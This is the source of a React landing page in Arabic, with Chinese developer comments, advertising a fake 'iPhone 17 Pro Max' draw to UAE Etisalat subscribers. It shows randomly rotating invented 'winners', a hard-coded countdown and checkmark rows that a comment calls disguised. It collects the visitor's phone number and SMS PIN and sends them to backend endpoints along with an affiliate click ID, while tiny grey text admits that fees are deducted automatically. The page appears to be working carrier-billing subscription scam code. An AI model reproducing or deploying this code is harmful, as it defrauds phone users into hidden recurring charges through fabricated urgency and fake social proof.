import { useState, useEffect } from "react";

export default function Home() {
  const [msisdn, setMsisdn] = useState("");
  const [pin, setPin] = useState(""); 
  const [clickId, setClickId] = useState("");
  const [txid, setTxid] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [errorMsg, setErrorMsg] = useState(""); 
  const [liveWinner, setLiveWinner] = useState("علي من عجمان تم تأكيد اشتراكه 🔥");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("cid")) {
      setClickId(params.get("cid"));
    }

    const winners = [
      "علي من عجمان تم تأكيد اشتراكه 🔥",
      "أحمد من دبي فاز للتو بفرصة سحب 🎁",
      "فاطمة من أبوظبي تم إرسال الرمز لها ✅",
      "سلطان من الشارقة دخل السحب للتو ⚡"
    ];
    const interval = setInterval(() => {
      setLiveWinner(winners[Math.floor(Math.random() * winners.length)]);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  async function submitNumber() {
    if (!msisdn) {
      setErrorMsg("يرجى إدخال رقم الهاتف");
      return;
    }
    setLoading(true);
    setErrorMsg("");

    let cleanMsisdn = msisdn.trim();
    if (cleanMsisdn.startsWith("0")) {
      cleanMsisdn = cleanMsisdn.substring(1);
    }
    if (!cleanMsisdn.startsWith("971")) {
      cleanMsisdn = "971" + cleanMsisdn;
    }

    try {
      const response = await fetch(`/api/request?msisdn=${cleanMsisdn}&click_id=${clickId}`);
      const data = await response.json();
      if (data.success) {
        setTxid(data.txid);
        setStep(2);
      } else {
        setErrorMsg("❌ عذراً، هذا الرقم غير مؤهل.");
      }
    } catch (err) {
      setErrorMsg("❌ حدث خطأ في الاتصال.");
    }
    setLoading(false);
  }

  async function submitPin() {
    if (!pin || pin.length < 4) {
      setErrorMsg("يرجى إدخال رمز PIN المكون من 4 أرقام");
      return;
    }
    setLoading(true);
    setErrorMsg("");

    try {
      const response = await fetch(`/api/verify?txid=${txid}&pin=${pin}&click_id=${clickId}`);
      const data = await response.json();
      if (data.stateCode === 0 || data.stateCode === 2) {
        setStep(3);
      } else {
        setErrorMsg("❌ رمز PIN غير صحيح.");
      }
    } catch (err) {
      setErrorMsg("❌ حدث خطأ أثناء التأكيد.");
    }
    setLoading(false);
  }

  return (
    <div style={styles.page}>
      {/* 顶部中奖弹幕条 */}
      <div style={styles.liveBanner}>
        <span style={styles.pulseDot}></span> {liveWinner}
      </div>

      <div style={styles.card}>
        <div style={styles.topBadge}>عرض حصري لمشتركي اتصالات</div>

        <div style={styles.imageContainer}>
          <img
            src="https://i.ibb.co/B5tGx9x2/iphone-16.png"
            style={styles.phone}
            alt="iPhone 17 Pro"
          />
        </div>

        <h1 style={styles.title}>iPhone 17 Pro Max</h1>
        <p style={styles.subtitle}>🎁 السحب السنوي الأكبر في الإمارات</p>

        {/* 倒计时倒数模块 - 优化间距 */}
        <div style={styles.countdownBox}>
          ⏰ ينتهي العرض خلال
          <div style={styles.countdownTimer}>2:46</div>
        </div>

        {/* 伪装的对勾信任行 */}
        <div style={styles.trustList}>
          <div style={styles.trustItem}>أدخل رقم هاتفك <span style={styles.checkmark}>✓</span></div>
          <div style={styles.trustItem}>تأكيد الاشتراك <span style={styles.checkmark}>✓</span></div>
          <div style={styles.trustItem}>دخول السحب فوراً <span style={styles.checkmark}>✓</span></div>
        </div>

        {errorMsg && <div style={styles.errorBubble}>{errorMsg}</div>}

        {/* 步骤 1：输入手机号 */}
        {step === 1 && (
          <div style={styles.formSection}>
            <input
              type="tel"
              placeholder="5xxxxxxxx"
              value={msisdn}
              onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
              style={styles.input}
            />

            <button style={styles.button} onClick={submitNumber} disabled={loading}>
              {loading ? "جاري التحقق..." : "شارك الآن 🎁"}
            </button>

            <div style={styles.bottomText}>
              بالضغط علىButton، أنت توافق على الشروط والأحكام. سيتم خصم الرسوم تلقائياً.
            </div>
          </div>
        )}

        {/* 步骤 2：输入 PIN 验证码 */}
        {step === 2 && (
          <div style={styles.formSection}>
            <div style={styles.successAlert}>
              ✅ تم إرسال رمز التحقق عبر رسالة قصيرة (SMS)
            </div>

            <input
              type="tel"
              placeholder="••••"
              maxLength={4}
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
              style={styles.pinInput}
            />

            <button style={styles.buttonVerify} onClick={submitPin} disabled={loading}>
              {loading ? "جاري التأكيد..." : "تأكيد الرمز ⚡"}
            </button>
          </div>
        )}

        {/* 步骤 3：成功 */}
        {step === 3 && (
          <div style={styles.successBox}>
            <div style={styles.successIcon}>✓</div>
            <div style={styles.successTitle}>تم التأكيد!</div>
            <p style={styles.successText}>لقد دخلت السحب الرسمي بنجاح.</p>
          </div>
        )}
      </div>
    </div>
  );
}

const styles = {
  page: {
    minHeight: "100vh",
    background: "#0a0a0a",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    padding: "60px 15px 40px 15px", // 顶部留出固定横幅位，底部留空，防止跑偏
    boxSizing: "border-box",
    position: "relative"
  },
  liveBanner: {
    position: "fixed", // 改为 fixed，在手机上永远置顶滚动
    top: 0,
    left: 0,
    right: 0,
    height: "44px",
    background: "#22c55e", // 对应你截图上的原版原汁原味高亮绿
    color: "#fff",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    fontSize: "14px",
    fontWeight: "bold",
    zIndex: 100,
    boxShadow: "0 2px 10px rgba(0,0,0,0.3)"
  },
  pulseDot: {
    width: "6px",
    height: "6px",
    background: "#fff",
    borderRadius: "999px",
    marginRight: "8px",
    display: "inline-block",
    animation: "pulse 1.5s infinite"
  },
  card: {
    width: "100%",
    maxWidth: "400px",
    background: "#121212",
    borderRadius: "24px",
    padding: "24px 20px", // 稍微收紧内边距，给下部腾出空间
    textAlign: "center",
    border: "1px solid #1a1a1a",
    boxShadow: "0 20px 50px rgba(0,0,0,0.8)",
    boxSizing: "border-box"
  },
  topBadge: {
    display: "inline-block",
    background: "#eab308", // 土豪金包裹
    color: "#000",
    padding: "6px 16px",
    borderRadius: "999px",
    fontSize: "13px",
    fontWeight: "bold",
    marginBottom: "16px"
  },
  imageContainer: {
    margin: "0 auto 12px auto"
  },
  phone: {
    width: "130px", // 稍微收紧图片尺寸，防止把输入框挤压下去
    height: "auto",
    display: "block",
    margin: "0 auto"
  },
  title: {
    color: "#fff",
    fontSize: "28px",
    fontWeight: "bold",
    margin: "0 0 4px 0"
  },
  subtitle: {
    color: "#a3a3a3",
    fontSize: "14px",
    margin: "0 0 16px 0"
  },
  countdownBox: {
    background: "#7f1d1d", // 截图上的暗红色倒计时背板
    color: "#fff",
    padding: "10px",
    borderRadius: "14px",
    fontSize: "14px",
    fontWeight: "bold",
    marginBottom: "16px"
  },
  countdownTimer: {
    fontSize: "24px",
    fontWeight: "900",
    color: "#eab308",
    marginTop: "2px"
  },
  trustList: {
    background: "#1e293b", // 暗蓝色排版行
    borderRadius: "14px",
    padding: "10px 14px",
    marginBottom: "20px",
    display: "flex",
    flexDirection: "column",
    gap: "8px"
  },
  trustItem: {
    color: "#fff",
    fontSize: "13px",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    gap: "6px"
  },
  checkmark: {
    color: "#22c55e",
    fontWeight: "bold"
  },
  formSection: {
    width: "100%",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    boxSizing: "border-box"
  },
  input: {
    width: "100%", // 撑满父容器，保证对齐
    height: "54px",
    borderRadius: "14px",
    border: "2px solid #334155",
    background: "#0f172a",
    color: "white",
    padding: "0 16px",
    fontSize: "18px",
    marginBottom: "14px",
    outline: "none",
    boxSizing: "border-box", // 极其重要：防止盒模型撑开错位
    textAlign: "center"
  },
  pinInput: {
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "2px solid #eab308",
    background: "#0f172a",
    color: "#eab308",
    padding: "0 16px",
    fontSize: "24px",
    textAlign: "center",
    letterSpacing: "12px",
    marginBottom: "14px",
    outline: "none",
    fontWeight: "bold",
    boxSizing: "border-box"
  },
  button: {
    width: "100%", // 100% 宽度，与输入框完美等宽对齐
    height: "54px",
    borderRadius: "14px",
    border: "none",
    background: "#eab308", // 原汁原味的亮黄中奖动作按钮
    color: "#000",
    fontSize: "18px",
    fontWeight: "bold",
    cursor: "pointer",
    marginBottom: "12px",
    boxSizing: "border-box",
    boxShadow: "0 4px 15px rgba(234,179,8,0.2)"
  },
  buttonVerify: {
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "none",
    background: "#22c55e",
    color: "#fff",
    fontSize: "18px",
    fontWeight: "bold",
    cursor: "pointer",
    marginBottom: "12px",
    boxSizing: "border-box"
  },
  errorBubble: {
    background: "rgba(239,68,68,0.2)",
    border: "1px solid #ef4444",
    color: "#ef4444",
    padding: "10px",
    borderRadius: "10px",
    fontSize: "13px",
    marginBottom: "14px",
    width: "100%",
    boxSizing: "border-box"
  },
  bottomText: {
    color: "#4b5563",
    fontSize: "10px",
    lineHeight: "1.4",
    marginTop: "4px"
  },
  successAlert: {
    background: "rgba(34,197,94,0.1)",
    border: "1px solid #22c55e",
    color: "#22c55e",
    padding: "10px",
    borderRadius: "10px",
    fontSize: "12px",
    marginBottom: "14px",
    width: "100%",
    boxSizing: "border-box"
  },
  successBox: {
    padding: "20px 0"
  },
  successIcon: {
    width: "60px",
    height: "60px",
    borderRadius: "999px",
    background: "#22c55e",
    color: "white",
    fontSize: "32px",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    margin: "0 auto 12px auto"
  },
  successTitle: {
    color: "#fff",
    fontSize: "24px",
    fontWeight: "bold"
  },
  successText: {
    color: "#a3a3a3",
    fontSize: "14px"
  }
};